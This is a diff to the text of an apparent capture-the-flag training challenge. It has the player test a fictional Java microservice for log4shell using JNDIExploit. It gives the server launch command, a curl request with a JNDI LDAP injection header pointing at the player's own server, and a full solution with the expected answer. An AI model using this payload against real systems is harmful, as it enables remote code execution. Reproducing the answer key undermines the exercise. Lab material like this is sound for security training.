@@ -4,17 +4,17 @@
 
 Looks like the attacker has been using JNDIExploit in your environment! That means they were likely trying to exploit log4j. That’s bad news, especially since you know the SudoSingles™ image optimization microservice is written in Java and uses log4j.
 
-You need to figure out if the <code>sudosingles-optimizer</code> service is vulnerable to the log4shell exploit. Now.
+You need to figure out if the "sudosingles-optimizer" service is vulnerable to the log4shell exploit. Now.
 
 A quick and efficient way to figure out if you’re vulnerable is to try to do the exploit yourself. (Maybe not the most secure way, though, so don’t try this at home.)
 
 ## DETAILS
 
-So, you're going to use JNDIExploit to see if <code>sudosingles-optimizer</code> is vulnerable. This challenge has many parts, so go through each one carefully.
+So, you're going to use JNDIExploit to see if "sudosingles-optimizer" is vulnerable. This challenge has many parts, so go through each one carefully.
 
 If you’re not already aware, JNDIExploit is a tool that sets up a malicious LDAP server that can be used to execute arbitrary commands on a host running an application vulnerable to the log4shell exploit.
 
-TLDR; you’re going to trick <code>sudosingles-optimizer</code> into connecting to a malicious server so you can run whatever commands we want inside its container.
+TLDR; you’re going to trick "sudosingles-optimizer" into connecting to a malicious server so you can run whatever commands we want inside its container.
 
 You have to set up the server first. To do this, do the following:
 
@@ -30,17 +30,17 @@ If you see something like the below, you’re on the right track:
 
 <pre> 
 
-<code> 
+" 
 
 [+] LDAP Server Start Listening on 1389... 
 
 [+] HTTP Server Start Listening on 9001... 
 
-</code> 
+" 
 
 </pre>
 
-To test to make sure it’s running correctly, <i>open another Terminal Emulator window</i> and run the following command, where YOURIP is your local IP: <code>curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'</code>
+To test to make sure it’s running correctly, <i>open another Terminal Emulator window</i> and run the following command, where YOURIP is your local IP: "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'"
 
 To complete this challenge, after you run the above command, enter the last line generated in the Terminal Emulator window where JNDIExploit is running, and hit “Submit.” If your answer doesn’t submit, double-check all the above steps. It could mean that something is wrong with the server command.
 
@@ -52,11 +52,11 @@ The answer will look something like this (fill in the blanks):
 
 <pre> 
 
-<code> 
+" 
 
 [+] _______ ______: ___ 
 
-</code> 
+" 
 
 </pre>
 
@@ -74,13 +74,13 @@ String answer:
 
 To find your IP address, you can run many commands in the Linux terminal. Maybe there’s some way to use the hostname command to get what you want?
 
-If you’re having trouble with JNDIExploit, maybe try looking at the <code>-h</code> flag?
+If you’re having trouble with JNDIExploit, maybe try looking at the "-h" flag?
 
 ### HINT 2
 
-<code>hostname -I</code> will give you your private IP address.
+"hostname -I" will give you your private IP address.
 
-<code>java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS</code> will start the server properly.
+"java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS" will start the server properly.
 
 Triple-check to make sure you’re using that IP address.
 
@@ -90,10 +90,10 @@ The answer is the <i>whole last line</i> from the Terminal window where you firs
 
 1. Open a Terminal Emulator window
 
-2. Run <code>hostname -I</code> to get your ip address
+2. Run "hostname -I" to get your ip address
 
-3. Run <code>java –jar JNDIExploit-1.2-SNAPSHOT.jar -i YOURIP</code>
+3. Run "java –jar JNDIExploit-1.2-SNAPSHOT.jar -i YOURIP"
 
-4. Open another window and run <code>curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'</code>
+4. Open another window and run "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'"
 
-5. If you are successful, you should see a line that looks like the following show up in your original terminal window: <code>[+] Response code: 200</code>
+5. If you are successful, you should see a line that looks like the following show up in your original terminal window: "[+] Response code: 200"
